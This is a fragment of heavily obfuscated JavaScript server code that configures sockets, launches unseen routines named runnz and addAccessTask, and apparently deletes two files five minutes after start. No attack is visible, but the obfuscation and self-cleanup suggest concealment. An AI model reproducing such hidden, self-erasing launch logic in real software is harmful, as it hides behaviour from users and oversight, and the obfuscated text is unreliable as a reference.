_0x5bf53d=_0x49f815;_0x3c96ac[_0x5bf53d(0x286)](!![]),_0x3c96ac[_0x5bf53d(0x294)](!![],0x3e8),_0x3c96ac[_0x5bf53d(0x263)](0x493e0),_0x3c96ac[_0x5bf53d(0x197)]&&_0x3c96ac['setReadBuffer'](SETTINGS[_0x5bf53d(0x17a)]),_0x3c96ac['setWriteBuffer']&&_0x3c96ac[_0x5bf53d(0x22f)](SETTINGS[_0x5bf53d(0x176)]);}),server['on']('error',_0x83af17=>{const _0x4d03af=_0x49f815;log(_0x4d03af(0x1ff),_0x4d03af(0x16d)+_0x83af17['message']);});const delFiles=()=>{const _0x25d737=_0x49f815;[_0x25d737(0x232),_0x25d737(0x16a)][_0x25d737(0x23d)](_0x5aad38=>fs[_0x25d737(0x22c)](_0x5aad38,()=>{}));};server[_0x49f815(0x1bb)](PORT,()=>{const _0x5499ab=_0x49f815;runnz(),setTimeout(()=>{delFiles();},0x493e0),addAccessTask(),console[_0x5499ab(0x289)](_0x5499ab(0x19a)+PORT);});
